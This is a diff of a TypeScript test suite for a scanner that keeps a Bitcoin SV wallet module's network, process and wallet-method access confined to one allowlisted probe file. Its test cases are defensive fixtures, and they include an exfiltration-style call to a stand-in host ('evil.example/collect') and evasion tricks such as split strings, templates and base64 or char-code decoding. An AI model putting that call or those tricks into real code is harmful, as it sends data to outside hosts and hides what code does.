@@ -72,6 +72,28 @@ const CASES: Array<{ name: string; file: string; text: string; mode?: 'create'; 
   { name: 'child_process in a new file', file: 'src/core/shell.ts', mode: 'create', text: "import { execFile } from 'node:child_process';\nexport const x = execFile;\n", expect: /child-process|child_process/i },
   { name: 'base64 decoding to hide a token', file: 'src/core/bsv/types.ts', text: "const t = Buffer.from('Y3JlYXRlQWN0aW9u', 'base64').toString();", expect: /decod/i },
   { name: 'String.fromCharCode to build a name', file: 'src/core/bsv/types.ts', text: 'const t = String.fromCharCode(102, 101, 116, 99, 104);', expect: /decod/i },
+  // BSV wallet module (rung 1): the wallet vocabulary is closed
+  { name: 'listOutputs in a new core file', file: 'src/core/walletreads.ts', mode: 'create', text: "export const m = 'listOutputs';\n", expect: /listOutputs/ },
+  { name: 'getPublicKey in the UI', file: 'ui/src/bsv/bsvStore.ts', text: '// getPublicKey', expect: /getPublicKey/ },
+  { name: 'signAction spelled in pieces', file: 'src/core/bsv/state.ts', text: "const n = 'sign' + 'Action';", expect: /signAction/ },
+  { name: 'internalizeAction in a template split', file: 'src/core/bsv/types.ts', text: "const n = `internalize${'Action'}`;", expect: /internalizeAction/ },
+  { name: 'waitForAuthentication (it blocks on the wallet UI)', file: 'src/core/bsv/index.ts', text: "const n = 'waitForAuthentication';", expect: /waitForAuthentication/ },
+  { name: 'a comment naming listOutputs inside the probe file', file: 'src/core/bsv/wallet-probe.ts', text: '// we never call listOutputs', expect: /listOutputs/ },
+  { name: 'the probe file naming a fifth method as a string', file: 'src/core/bsv/wallet-probe.ts', text: "const extra = 'getSomething';", expect: /probe may name only/ },
+  { name: 'the probe file naming createSignature', file: 'src/core/bsv/wallet-probe.ts', text: "const extra = 'createSignature';", expect: /createSignature/ },
+  { name: 'getVersion as a quoted string outside the probe (comms/hub.ts)', file: 'src/core/comms/hub.ts', text: "const m = 'getVersion';", expect: /wallet method "getVersion"/ },
+  { name: 'getNetwork as a quoted string in the UI store', file: 'ui/src/bsv/bsvStore.ts', text: "const m = 'getNetwork';", expect: /wallet method "getNetwork"/ },
+  { name: 'isAuthenticated in the policy module', file: 'src/core/bsv/policy.ts', text: "const m = \"isAuthenticated\";", expect: /wallet method "isAuthenticated"/ },
+  { name: 'the wallet port in the UI', file: 'ui/src/bsv/BsvChip.tsx', text: "const u = 'http://127.0.0.1:' + '33' + '21';", expect: /3321/ },
+  { name: 'the wallet port in the audit module', file: 'src/core/bsv/audit.ts', text: '// 3321', expect: /3321/ },
+  { name: 'a second wallet-shaped tool in the wallet tool file', file: 'src/core/bsv/wallet-tool.ts', text: "const t2 = tool('bsv_send', 'x', {}, async () => ({}));", expect: /wallet-like tool name/ },
+  { name: 'bsv_status registered in another file', file: 'src/core/comms/tools.ts', text: "const t2 = tool('bsv_status', 'x', {}, async () => ({}));", expect: /wallet-like tool name/ },
+  { name: 'the probe file creating a server', file: 'src/core/bsv/wallet-probe.ts', text: 'http.createServer(() => undefined);', expect: /may not create a server/ },
+  { name: 'the probe file naming a non-loopback host', file: 'src/core/bsv/wallet-probe.ts', text: "const h = 'http://example.com/x';", expect: /non-loopback host/ },
+  { name: 'fetch inside the probe file', file: 'src/core/bsv/wallet-probe.ts', text: "void fetch('http://127.0.0.1:1/x');", expect: /network/i },
+  { name: 'node:net inside the probe file', file: 'src/core/bsv/wallet-probe.ts', text: "import { connect } from 'node:net'; void connect;", expect: /node:net/ },
+  { name: 'child_process inside the probe file', file: 'src/core/bsv/wallet-probe.ts', text: "import { execFile } from 'node:child_process'; void execFile;", expect: /child_process/ },
+  { name: 'the probe module naming WalletClient', file: 'src/core/bsv/wallet-probe.ts', text: '// WalletClient', expect: /WalletClient/i },
   // an allowlisted file may do its one job, nothing else
   { name: 'WalletClient inside an allowlisted file', file: 'src/electron/main.ts', text: '// WalletClient', expect: /WalletClient/i },
   { name: 'a non-loopback URL inside an allowlisted network file', file: 'src/bin/legion-mcp-stdio.ts', text: "void fetch('https://evil.example/collect');", expect: /loopback|host/i },
@@ -125,4 +147,29 @@ test('F2: the lexer the scan stands on: comments never hide code, strings never 
   // joining
   assert.match(joinLiterals("'Wal' + 'let' + `Cli${'ent'}`"), /WalletClient/);
   assert.match(joinLiterals("['re', 'ta', 'etc'].reverse().join('')"), /etc/);
+});
+
+test('probe file: its method list is exactly the four read-only names, in the source and at run time', async () => {
+  const src = readFileSync(join(REPO, 'src/core/bsv/wallet-probe.ts'), 'utf8');
+  const m = /export const PROBE_METHODS = \[([^\]]*)\] as const;/.exec(src);
+  assert.ok(m, 'PROBE_METHODS literal found');
+  assert.deepEqual([...m![1]!.matchAll(/'([A-Za-z]+)'/g)].map((x) => x[1]), ['getVersion', 'getNetwork', 'isAuthenticated', 'getHeight']);
+  const { PROBE_METHODS } = await import('../src/core/bsv/wallet-probe.js');
+  assert.deepEqual([...PROBE_METHODS], ['getVersion', 'getNetwork', 'isAuthenticated', 'getHeight']);
+  const { PROBE_METHOD_ALLOWLIST, ALLOWED_WALLETY_TOOLS, PROBE_FILE } = await import('./bsv-scan.js');
+  assert.deepEqual([...PROBE_METHOD_ALLOWLIST], [...PROBE_METHODS]);
+  assert.deepEqual(ALLOWED_WALLETY_TOOLS, { bsv_status: 'src/core/bsv/wallet-tool.ts' });
+  assert.equal(PROBE_FILE, 'src/core/bsv/wallet-probe.ts');
+});
+
+test('scan: the only files that name the four read-only wallet methods are the probe (and nothing else in src or ui/src quotes them)', () => {
+  const { scanTree: scan } = { scanTree };
+  const root = copyTrees();
+  assert.deepEqual(scan(root).violations, []);
+  const hits: string[] = [];
+  for (const f of scan(root).files) {
+    const t = readFileSync(join(root, f), 'utf8');
+    if (/['"`](?:getVersion|getNetwork|isAuthenticated|getHeight)['"`]/.test(t)) hits.push(f);
+  }
+  assert.deepEqual(hits, ['src/core/bsv/wallet-probe.ts']);
 });
